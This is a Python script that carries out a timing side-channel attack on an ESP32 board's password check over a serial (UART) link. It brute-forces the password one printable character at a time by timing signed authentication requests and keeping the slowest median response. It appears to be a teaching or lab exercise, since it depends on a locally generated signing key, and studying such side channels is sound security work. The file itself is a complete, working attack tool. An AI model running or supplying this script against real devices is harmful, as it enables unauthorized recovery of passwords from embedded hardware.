
#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "cryptography>=42",
#     "pyserial>=3.5",
# ]
# ///

"""UART password timing attack against the ESP32 authentication command."""

import argparse
import statistics
import sys
import time

import serial
from serial.tools import list_ports

from keygen import PRIVATE_KEY_PATH, load_private_key


# ---------------- Configuration ----------------

BAUD_RATE = 115200
SERIAL_TIMEOUT = 2.0

NUM_TESTS = 100
MAX_PASSWORD_LENGTH = 16

CMD_PREFIX = "CMD "
CMD_AUTH_CHECK = 1
SIGNATURE_LEN = 64

# All printable ASCII characters, including space.
ASCII_CHARS = [chr(i) for i in range(32, 127)]


# ---------------- Serial setup ----------------

KNOWN_USB_SERIAL = {
    (0x10C4, 0xEA60): "CP210x",
    (0x1A86, 0x7523): "CH340",
    (0x1A86, 0x55D4): "CH9102",
    (0x0403, 0x6001): "FT232",
    (0x0403, 0x6015): "FT231X",
    (0x303A, 0x1001): "ESP32 USB",
}


def find_port():
    ports = list(list_ports.comports())
    matches = [p for p in ports if (p.vid, p.pid) in KNOWN_USB_SERIAL]

    if len(matches) == 1:
        return matches[0].device

    print("Could not uniquely identify ESP32 serial port.")
    for p in ports:
        print(f"  {p.device}: {p.description}")

    sys.exit(1)


# ---------------- Request construction ----------------

def build_check_request(key, password: str) -> bytes:
    """
    Wire payload:
        command (1) | password (16) | signature (64)
    """
    try:
        data = password.encode("ascii")
    except UnicodeEncodeError:
        sys.exit("--passcode must be plain ASCII characters")

    if len(data) > MAX_PASSWORD_LENGTH:
        sys.exit(f"--passcode is limited to {MAX_PASSWORD_LENGTH} characters")

    signed = (
        bytes([CMD_AUTH_CHECK])
        + data.ljust(MAX_PASSWORD_LENGTH, b"\0")
    )

    signature = key.sign(signed)

    return signed + signature


# ---------------- Password checking ----------------

def check_password(link, request: str):
    """
    Send a preconstructed request and wait for the response.

    The caller measures this function's execution time.
    """

    # Discard stale responses.
    link.reset_input_buffer()

    # Send request.
    link.write(request.encode("ascii"))
    link.flush()

    # Wait for response.
    response = link.readline()

    return response.decode("ascii", errors="replace").strip()


# ---------------- Timing attack ----------------

def timing_attack(link, key):

    result_pass = ""

    print("\nStarting timing attack...")
    print(f"Testing {len(ASCII_CHARS)} characters")
    print(f"Measurements per character: {NUM_TESTS}\n")

    while len(result_pass) < MAX_PASSWORD_LENGTH:
        current_max_time = 0
        current_max_ch = ""

        for ch in ASCII_CHARS:
            candidate = result_pass + ch

            # Construct and sign BEFORE timing.
            request = (
                CMD_PREFIX
                + build_check_request(key, candidate).hex()
                + "\n"
            )

            times = []

            for _ in range(NUM_TESTS):
                T1 = time.perf_counter()

                msg = check_password(link, request)

                T2 = time.perf_counter()
                elapsed = T2 - T1

                if msg == "ACCEPTED":
                    print(f"\nPassword found: {candidate!r}")
                    return candidate

                if msg != "REJECTED":
                    print(f"Unexpected board response: {msg!r}")
                    continue

                times.append(elapsed)

            if not times:
                continue

            median_time = statistics.median(times)

            if median_time > current_max_time:
                current_max_time = median_time
                current_max_ch = ch

        if not current_max_ch:
            print("No valid timing measurements.")
            return None

        result_pass += current_max_ch

        print(
            f"Guess: {result_pass!r} | "
            f"Median: {current_max_time * 1000:.3f} ms"
        )

    print("\nReached maximum password length.")
    return result_pass


# ---------------- Main ----------------

def main():
    global NUM_TESTS

    parser = argparse.ArgumentParser(
        description="UART password timing attack"
    )

    parser.add_argument(
        "--port",
        help="Serial port (automatically detected if omitted)",
    )

    parser.add_argument(
        "--baud",
        type=int,
        default=BAUD_RATE,
    )

    parser.add_argument(
        "--tests",
        type=int,
        default=NUM_TESTS,
    )

    args = parser.parse_args()

    if args.tests < 1:
        sys.exit("--tests must be at least 1")

    NUM_TESTS = args.tests

    if not PRIVATE_KEY_PATH.exists():
        sys.exit("No private key yet: run `make keys` first")

    key = load_private_key()

    port = args.port or find_port()

    print(f"Connecting to {port} at {args.baud} baud...")

    link = serial.Serial()
    link.port = port
    link.baudrate = args.baud
    link.timeout = SERIAL_TIMEOUT

    # Avoid resetting the ESP32 when opening the serial port.
    link.dtr = False
    link.rts = False

    try:
        link.open()

        time.sleep(0.2)
        link.reset_input_buffer()

        password = timing_attack(link, key)

        if password:
            print(f"\nFinal password guess: {password!r}")

    except KeyboardInterrupt:
        print("\nAttack interrupted.")

    finally:
        if link.is_open:
            link.close()


if __name__ == "__main__":
    main()
